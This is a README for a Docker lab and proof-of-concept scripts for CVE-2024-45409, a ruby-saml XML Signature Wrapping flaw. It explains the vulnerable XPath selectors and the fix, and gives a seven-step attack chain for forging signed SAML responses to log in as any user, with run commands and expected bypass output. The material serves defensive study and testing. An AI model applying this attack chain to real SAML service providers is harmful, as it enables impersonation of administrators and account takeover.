# CVE-2024-45409 - ruby-saml SAML Authentication Bypass via XML Signature Wrapping

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2024-45409 |
| Component | [ruby-saml](https://github.com/SAML-Toolkits/ruby-saml) |
| Type | CWE-347: Improper Verification of Cryptographic Signature |
| CVSS | 10.0 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| EPSS | 40.7% (97.3rd percentile) |
| Affected | ruby-saml 1.13.0 – 1.16.0 and <= 1.12.2; omniauth-saml <= 1.10.3, 2.0.0 – 2.1.0; GitLab <= 16.11.10 |
| Fix | ruby-saml [v1.17.0](https://github.com/SAML-Toolkits/ruby-saml/commit/4865d030cae9705ee5cdb12415c654c634093ae7) / [v1.12.3](https://github.com/SAML-Toolkits/ruby-saml/commit/1ec5392bc506fe43a02dbb66b68741051c5ffeae) |
| Author | Exploit Intelligence Platform |
| Date | 2024-09-10 |

## Vulnerability Details

CVE-2024-45409 is a critical authentication bypass vulnerability in the ruby-saml library. The `validate_signature` method in `XMLSecurity::SignedDocument` uses document-global XPath selectors (`//`) instead of context-relative selectors (`./`) when resolving signature-related elements during SAML Response verification. This allows an unauthenticated attacker to perform an XML Signature Wrapping (XSW) attack — forging a SAML Response to authenticate as any user, including administrators, using only a previously captured (even expired) legitimately signed SAML Response.

Five vulnerable XPath expressions exist in `lib/xml_security.rb`:

| Vulnerable XPath | Fixed XPath | Element |
|---|---|---|
| `//ds:Reference` | `./ds:Reference` | Signature Reference |
| `//ds:DigestMethod` | `./ds:DigestMethod` | Digest algorithm |
| `//ds:DigestValue` | `./ds:DigestValue` | Digest value |
| `//ds:CanonicalizationMethod` | `./ds:CanonicalizationMethod` | C14N method |
| `//ds:Transforms/ds:Transform` | `./ds:Transforms/ds:Transform` | Transform chain |

### Attack Chain

```
1. Obtain any legitimately signed SAML Response from the target IdP (even expired)
2. Move the original <ds:Signature> into the <saml:Assertion> element
3. Modify <saml:NameID> to target user (e.g., admin@example.com)
4. Extend temporal conditions (NotOnOrAfter, SessionNotOnOrAfter) to future dates
5. Inject a crafted <ds:Reference> in <samlp:StatusDetail> with a recomputed
   DigestValue matching the modified assertion
6. Submit the forged response — //ds:Reference finds the injected Reference first,
   digest check passes, cryptographic signature remains valid over original SignedInfo
7. Authentication bypass complete — attacker is logged in as the target user
```

### Fix

The fix (commit [`4865d03`](https://github.com/SAML-Toolkits/ruby-saml/commit/4865d030cae9705ee5cdb12415c654c634093ae7), released as v1.17.0; backported in [`1ec5392`](https://github.com/SAML-Toolkits/ruby-saml/commit/1ec5392bc506fe43a02dbb66b68741051c5ffeae) as v1.12.3):

1. All `//ds:*` XPath selectors replaced with `./ds:*` (context-relative) under `signed_info_element`
2. New intermediate variable `signed_info_element` resolved via `./ds:SignedInfo` relative to Signature
3. Defense-in-depth: reject duplicate ID elements (`reference_nodes.length > 1`)

## Lab Setup

### Architecture

```
┌──────────────────────────────────────────┐
│  cve-2024-45409-vulnerable               │
│  Ruby 3.1 + Sinatra + ruby-saml 1.16.0  │
│  SAML Service Provider on port 4567      │
│  Mock IdP with signing keys              │
│  Port 4567 (host: 4567)                 │
└──────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2024-45409

# Build and start
docker compose build
docker compose up -d

# Run the exploit
python3 poc/poc.py --target-host localhost --target-port 4567 --target-user admin@example.com

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2024-45409-vulnerable` | SAML SP | `ruby:3.1-slim-bookworm` | `4567` | Sinatra SAML Service Provider with ruby-saml 1.16.0, mock IdP, and exploit tools |

### SP Endpoints

| Endpoint | Method | Description |
|---|---|---|
| `/` | GET | Status page with HTML test form |
| `/health` | GET | JSON health check |
| `/saml/acs` | POST | ACS endpoint (base64-encoded SAMLResponse form parameter) |
| `/saml/acs_raw` | POST | ACS endpoint (raw XML body) |

### Credentials

| Service | Username | Password |
|---|---|---|
| SAML SP | N/A (SAML SSO) | Auth token: `Bearer my-secret-token` for mock IdP |

## PoC Usage

Three PoC scripts are provided in `poc/`. All require **Python 3 with `lxml`** (`pip install lxml`). The primary PoC uses `docker exec` to invoke the mock IdP inside the container for generating legitimate SAML responses.

### `poc.py` — Primary Exploit (Impersonate Any User)

Performs the full attack chain: generates a legitimate SAML response via the mock IdP, forges it with a target user, and submits to the vulnerable SP.

```bash
# Full end-to-end attack against the lab
python3 poc/poc.py --target-host localhost --target-port 4567 --target-user admin@example.com

# Forge an existing SAML response (offline)
python3 poc/poc.py --input captured_response.xml --target-user admin@example.com --output forged.xml
```

### Expected Output (Vulnerable)

```
======================================================================
  CVE-2024-45409: ruby-saml XML Signature Wrapping PoC
  SAML Authentication Bypass — Impersonate Any User
======================================================================

[PHASE 1] Obtaining a legitimate SAML response
  Source user: user@example.com
  Container:   cve-2024-45409-vulnerable

[PHASE 1] Verifying legitimate response against SP...
  HTTP 200: {"status":"authenticated","name_id":"user@example.com",...}
  [OK] Legitimate auth as user@example.com confirmed

[PHASE 2] Forging SAML response to impersonate: admin@example.com

[PHASE 3] Submitting forged response to SP (raw XML endpoint)
  HTTP 200: {"status":"authenticated","name_id":"admin@example.com",...}

======================================================================
  [VULNERABLE] Authentication bypass CONFIRMED!
  Authenticated as: admin@example.com
  Original user was: user@example.com
======================================================================
```

### `poc_vector2_multi_user.py` — Multi-User Impersonation

Demonstrates that a single captured SAML response can be reused to impersonate multiple different users (5/5 accounts compromised from one response).

```bash
python3 poc/poc_vector2_multi_user.py
```

### `poc_vector3_response_sig.py` — Response-Level Signature Attack

Proves the attack works regardless of whether the IdP signs at the Response level or Assertion level.

```bash
python3 poc/poc_vector3_response_sig.py
```

## Verification: Vulnerable vs Patched

| Test | Vulnerable (v1.16.0) | Patched (v1.17.0) |
|---|---|---|
| Legitimate auth (`user@example.com`) | `200 OK` — authenticated | `200 OK` — authenticated |
| Forged response (`admin@example.com`) | **`200 OK` — BYPASSED** | `rejected — Digest mismatch` |
| Multi-user impersonation (5 users) | **5/5 BYPASSED** | 0/5 — all rejected |
| Response-level signature attack | **BYPASSED** | rejected |

## Known Issues

1. **Python C14N mismatch:** The Synacktiv Python exploit (`exploit.py`) uses lxml for XML canonicalization, which produces slightly different output than Ruby's Nokogiri. The `poc.py` scripts solve this with whitespace-aware element manipulation. For in-container testing, use `ruby_exploit.rb` instead.

2. **Test certificate expired:** The IdP certificate (`certs/ruby-saml.crt`) from ruby-saml's test suite expired in 2015. ruby-saml does not check certificate validity dates during signature verification, so this does not affect the lab.

3. **RSA 1024-bit key:** The test certificate uses a 1024-bit RSA key. This is from ruby-saml's own test suite and is sufficient for demonstrating the vulnerability.

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary exploit — full attack chain with forging and submission |
| `poc/poc_vector2_multi_user.py` | Multi-user impersonation from single captured response |
| `poc/poc_vector3_response_sig.py` | Response-level signature attack variant |
| `poc/forged_response.xml` | Example forged SAML response output |
| `Dockerfile.vulnerable` | Ruby 3.1 + ruby-saml 1.16.0 + Sinatra SP container |
| `docker-compose.yml` | Lab orchestration — single container on port 4567 |
| `sp_app.rb` | Sinatra-based SAML Service Provider application |
| `mock_idp.rb` | Mock Identity Provider — generates signed SAML responses |
| `ruby_exploit.rb` | Ruby CVE-2024-45409 exploit (Nokogiri C14N, recommended) |
| `exploit.py` | Python Synacktiv exploit (lxml C14N) |
| `certs/` | IdP signing certificate and private key |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis and fix assessment |
| `lab_build_report.md` | Lab construction documentation |
| `poc_verification_report.md` | Full test results across all vectors |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2024-45409)
- [Vendor Advisory (GHSA-jw9c-mfg7-9rx2)](https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2)
- [Fix Commit (v1.17.0)](https://github.com/SAML-Toolkits/ruby-saml/commit/4865d030cae9705ee5cdb12415c654c634093ae7)
- [Fix Commit (v1.12.3)](https://github.com/SAML-Toolkits/ruby-saml/commit/1ec5392bc506fe43a02dbb66b68741051c5ffeae)
- [OmniAuth-SAML Advisory](https://github.com/omniauth/omniauth-saml/security/advisories/GHSA-cvp8-5r8g-fhvq)
- [Synacktiv PoC](https://github.com/synacktiv/CVE-2024-45409)
- [Debian Advisory](https://lists.debian.org/debian-lts-announce/2024/11/msg00006.html)
- [NetApp Advisory](https://security.netapp.com/advisory/ntap-20240926-0008/)

## Timeline

| Date | Event |
|---|---|
| 2024-09-10 | CVE assigned; ruby-saml v1.17.0 and v1.12.3 released with fix |
| 2024-09-10 | Advisory GHSA-jw9c-mfg7-9rx2 published |
| 2024-09-17 | GitLab security patches released |
| 2024-09-26 | NetApp advisory published |
| 2024-10-15 | Added to VulnCheck KEV (confirmed exploited in the wild) |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2024-45409 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
